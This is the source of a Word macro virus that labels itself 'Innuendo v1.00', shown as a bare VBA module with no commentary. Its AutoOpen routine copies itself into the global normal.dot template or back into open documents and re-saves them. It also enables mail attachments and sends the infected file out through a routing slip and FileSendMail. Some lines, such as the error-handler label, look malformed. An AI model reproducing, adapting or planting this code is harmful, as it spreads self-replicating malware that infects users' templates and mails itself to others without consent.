   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim nor$
   Dim infected
   Dim normal
   Dim count_
   Dim dlg2 As Object


   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
   WordBasic.CurValues.ToolsOptionsGeneral dlg
   dlg.SendMailAttach = 1
   WordBasic.ToolsOptionsGeneral dlg

   On Error Goto -1 : On Error Goto err.Number
   nor$ = WordBasic.[DefaultDir$](2) + "/normal.dot"
   infected = 0
   normal = WordBasic.CountMacros(0)
   If normal > 0 Then
   For count_ = 1 To normal
   If WordBasic.[MacroName$](count_, 0, 0) = "AutoOpen" Then
   infected = 1
   End If
   Next count_
   End If
   If infected = 0 Then
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", nor$ + ":AutoOpen"
   WordBasic.FileSave
   Else
   WordBasic.MacroCopy nor$ + ":AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   Set dlg2 = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg2
   dlg2.Format = 1
   WordBasic.FileSaveAs dlg2
   End If

   Err.Number:
   Dim dlg1 As Object: Set dlg1 = WordBasic.DialogRecord.FileRoutingSlip(False)
   WordBasic.CurValues.FileRoutingSlip dlg1
   Rem Dialog dlg1
   dlg1.Subject = "Welcome to.."
   dlg1.Message = "Innuendo v1.00"
   dlg1.AllAtOnce = 1
   dlg1.TrackStatus = 1
   dlg1.Protect = 3
   WordBasic.FileRoutingSlip dlg1
   WordBasic.FileSendMail
   WordBasic.MsgBox "Innuendo v1.00", 48

   End Sub
